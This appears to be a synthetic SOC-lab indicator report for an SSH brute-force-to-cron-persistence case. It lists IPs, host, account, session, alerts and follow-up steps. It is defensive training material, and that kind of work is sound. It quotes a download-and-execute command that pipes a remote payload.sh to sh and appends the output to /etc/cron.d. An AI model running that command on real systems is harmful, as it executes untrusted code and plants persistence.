# CASE-010 — Indicators and Investigation Pivots

## 1. Purpose

This document records indicators and investigative pivots identified during the CASE-010 multi-stage attack investigation.

Indicators are classified according to the evidence available in the synthetic SOC laboratory.

The presence of an indicator does not independently establish maliciousness or compromise.

## 2. Indicator Classification

| Category          | Value                       | Classification                 | Significance                                                |
| ----------------- | --------------------------- | ------------------------------ | ----------------------------------------------------------- |
| Source IP         | `198.51.100.90`             | Synthetic laboratory indicator | Source associated with observed SSH authentication activity |
| Destination host  | `lab-linux-10`              | Host pivot                     | Primary affected laboratory host                            |
| User              | `root`                      | Identity pivot                 | Account associated with all correlated stages               |
| Session           | `SES-010-A`                 | Session pivot                  | Session associated with post-authentication activity        |
| File path         | `/etc/cron.d/system-update` | Host persistence pivot         | Suspicious cron persistence location                        |
| Download IP       | `203.0.113.80`              | Synthetic laboratory indicator | Network endpoint represented in the persistence command     |
| Download resource | `/payload.sh`               | Command/resource pivot         | Shell resource referenced by the observed command           |
| Event IDs         | `EVT-010001`–`EVT-010013`   | Evidence pivots                | Supporting events for the correlated sequence               |
| Alert IDs         | Three underlying alerts     | Detection pivots               | Independent detection evidence used for correlation         |

## 3. Network Indicators

### 3.1 Source IP

```text
198.51.100.90
```

This address is associated with the six failed SSH authentication attempts and the subsequent successful authentication.

It is also present in the post-authentication detection output.

The address is laboratory data and must not be interpreted as a real-world malicious IP.

### 3.2 Download Endpoint

```text
203.0.113.80
```

The persistence telemetry contains a command referencing this address:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

This is a synthetic laboratory endpoint.

No external reputation or ownership conclusion is made from this value.

### 3.3 Network Investigation Questions

A real investigation would validate:

* whether the source address belongs to an authorized user or system;
* whether SSH access was expected;
* whether connections to the download endpoint occurred;
* whether DNS or proxy telemetry provides additional context;
* whether the same source interacted with other hosts; and
* whether network activity continued after the persistence event.

These actions are investigation recommendations, not claims that the activity occurred.

## 4. Host Indicators

### 4.1 Laboratory Host

```text
lab-linux-10
```

All three correlated detection stages share this host.

This makes the host the primary investigation pivot.

### 4.2 Cron Persistence Path

```text
/etc/cron.d/system-update
```

The path is associated with `EVT-010013`.

The file name and location should be examined in a real investigation for:

* file creation or modification time;
* file ownership and permissions;
* file contents;
* process responsible for modification;
* persistence execution history; and
* related file-system activity.

The current synthetic telemetry does not independently establish all of these properties.

## 5. Identity Indicators

### User

```text
root
```

The `root` account is associated with:

* failed SSH authentication attempts;
* successful SSH authentication;
* post-authentication session activity; and
* Linux persistence activity.

Because `root` is a privileged account, activity associated with it warrants elevated investigative priority.

The telemetry does not establish whether use of the account was authorized.

## 6. Session Indicators

### Session ID

```text
SES-010-A
```

The session begins at:

```text
EVT-010008
```

and is associated with the subsequent commands:

```text
EVT-010009
EVT-010010
EVT-010011
EVT-010012
```

The session is therefore a useful pivot for reconstructing post-authentication activity.

## 7. Command-Line Indicators

### Discovery Commands

Observed commands:

```text
whoami
id
sudo -l
uname -a
```

These commands represent:

* account/context discovery;
* identity and group discovery;
* privilege-related enumeration; and
* system information discovery.

They are not inherently malicious.

### Persistence Command

Observed command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

This command combines:

1. network retrieval;
2. shell execution;
3. redirection into a cron persistence location.

The combination materially increases investigative significance.

The telemetry does not independently prove that the downloaded content was malicious or that the resulting cron configuration executed successfully.

## 8. Detection Indicators

### DET-AUTH-001

Observed detection characteristics:

* six failed SSH authentication attempts;
* five-failure threshold exceeded;
* successful authentication afterward;
* source IP `198.51.100.90`;
* target user `root`.

Alert:

```text
ALERT-CASE-001-DET-AUTH-001
```

### DET-AUTH-003

Observed detection characteristics:

* six failed authentication attempts;
* successful authentication;
* session establishment;
* four post-authentication commands;
* privilege-related indicators;
* source IP `198.51.100.90`;
* session `SES-010-A`.

Alert:

```text
ALERT-CASE-004-DET-AUTH-003
```

### DET-LINUX-001

Observed detection characteristics:

* cron persistence path;
* suspicious shell/download execution;
* hidden payload indicator;
* successful Linux persistence event.

Alert:

```text
ALERT-CASE-009-DET-LINUX-001-EVT-010013
```

The alert identifier retains the namespace produced by the underlying detector.

### DET-CORR-001

Final correlated alert:

```text
ALERT-CASE-010-DET-CORR-001
```

The correlation alert combines the three independent detection alerts.

## 9. Supporting Event Pivots

The correlated evidence contains:

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
EVT-010007
EVT-010008
EVT-010009
EVT-010010
EVT-010011
EVT-010012
EVT-010013
```

The benign scheduled-task event:

```text
EVT-010014
```

was not included in the final correlated evidence.

It remains relevant as a comparison point for legitimate administrative activity.

## 10. Indicator Relationships

The investigation pivots can be represented as:

```text
198.51.100.90
       |
       v
SSH authentication activity
       |
       v
root
       |
       v
lab-linux-10
       |
       v
SES-010-A
       |
       v
Discovery / privilege-related commands
       |
       v
/etc/cron.d/system-update
       |
       v
203.0.113.80/payload.sh
```

This relationship is an investigative representation of observed telemetry.

It does not establish attacker identity or malicious intent.

## 11. IOC Handling

The following values should be treated as **laboratory indicators**, not production threat intelligence:

* `198.51.100.90`
* `203.0.113.80`
* `lab-linux-10`
* `SES-010-A`
* `EVT-010001` through `EVT-010014`

The IP addresses are reserved documentation-network addresses used in the synthetic scenario.

No external reputation is inferred from their presence.

## 12. Recommended Follow-Up

A real SOC investigation should attempt to validate:

1. Source IP ownership and authentication authorization.
2. Account ownership and expected `root` usage.
3. SSH authentication logs outside the current telemetry window.
4. Process execution associated with the persistence command.
5. Contents of `/etc/cron.d/system-update`.
6. File metadata and modification history.
7. Network connections to the referenced download endpoint.
8. Additional hosts contacted by the same source.
9. Other cron entries created or modified by the same account.
10. Persistence execution after the configuration change.
11. Related shell history or command telemetry.
12. Additional indicators generated by endpoint or network analysis.

These are recommended investigative actions and are not represented as completed activity.

## 13. Limitations

The available evidence does not provide:

* real-world IP reputation;
* confirmed file hashes;
* complete process ancestry;
* complete network telemetry;
* complete authentication history;
* file contents beyond the observed command context;
* proof of successful payload execution;
* proof of persistence execution;
* proof of unauthorized access; or
* proof of compromise.

Accordingly, indicators should be used as investigation pivots rather than definitive compromise artifacts.

## 14. Evidence Classification

### Observed

Directly represented in the laboratory evidence:

* source IP;
* destination host;
* user;
* session ID;
* command lines;
* persistence path;
* event IDs;
* detection IDs;
* alert IDs.

### Analyst Interpretation

Derived from relationships between observed values:

* the stages form a coherent chronological sequence;
* the shared pivots increase correlation confidence;
* the persistence command materially increases investigative significance.

### Recommended Action

Not yet established as executed:

* external reputation checks;
* host examination;
* process analysis;
* network hunting;
* persistence validation;
* authorization validation.

## 15. Conclusion

CASE-010 contains multiple useful investigative pivots across network, host, identity, session, command-line, detection, and event evidence.

The indicators support continued investigation of the correlated multi-stage sequence.

They should not be interpreted individually as proof of compromise.

The strongest investigative relationship is the combination of:

```text
source IP
   +
privileged account
   +
successful authentication
   +
post-authentication activity
   +
cron persistence
   +
download-and-execute behavior
```

This combination forms the primary evidence base for the CASE-010 investigation.
